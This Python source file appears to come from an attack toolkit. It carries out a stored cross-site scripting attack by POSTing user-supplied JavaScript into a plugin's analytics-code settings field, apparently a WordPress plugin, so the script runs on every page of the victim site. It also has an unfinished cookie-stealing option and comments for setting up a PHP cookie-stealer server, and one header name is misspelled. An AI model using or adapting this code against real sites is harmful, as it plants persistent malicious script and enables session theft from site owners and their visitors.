import SQLInj
import John
import FileDownload
import XSS
import requests
import os



def attack(url):
    attackChoice(url)


def attackChoice(url):
    print("This is an XSS attack, you are going to store some javascript on all the pages of the victim")
    print("1: Specify a custom payload to be stored ")
    print("2: Steal victim's cookies")
    result = False;
    choice = input("\n Choose the operation to perform : ")
    while (not (choice=="1" or choice=="2")):
        choice = input("\n You have chosen an invalid option, choose 1 or 2 : ")
    if (choice=="1"):
        result = loadCustomPayload(url)
    elif (choice=="2"):
        print("stealcokies")


def loadCustomPayload(url):
    payload = input("insert your payload in javascript code : ")
    page = input("insert the page to be added in the URL , example: /ciao-mondo/ : ")
    confirm = input ("Do you want to load payload on : "+url+page +"  ?    Y/n ?")

    while (not (confirm ==  "Y" or confirm == "n")):
        confirm = input("Insert Y or n")

    while (confirm == "n"):
        page = input("insert the page to attack or '?' to exit : ")
        if(page=='?'):
            return False
        confirm = input("Do you want to load payload on : " + url + page + "  ?    Y/n ?")

    if confirm == "Y":
        response = sendRequest(url + page, payload)
        if (not response.status_code == 404):
            print("Successfull payload upload")
            return True
        else:
            print("Error, page not found")
            return False



def phpServerSetup(url):
    print("To run the cookie stealer you should have installed php 5.4 or more recent version")
    phpPath = input("Plese insert the ABSOLUTE path to the PHP folder")
    filePath = input("Please insert the path where you would like to store the cookies and the php cookie stealer")

    #ask for path of execution folder
    #upload the file cookie stealer
    #perform the request
    #C:\xampp\php>php -S 127.0.0.1:80 -t C:\xampp



def sendRequest(url,script):
    headers = {'content-ty  e': 'application/x-www-form-urlencoded', 'host': 'localhost'}
    attack_script = script
    raw_data = 'sgcgoogleanalytic=' + attack_script + '&sgcwebtools=&button=Save+Changes&action=savegooglecode'
    response = requests.post(url, headers=headers, data=raw_data)
    return response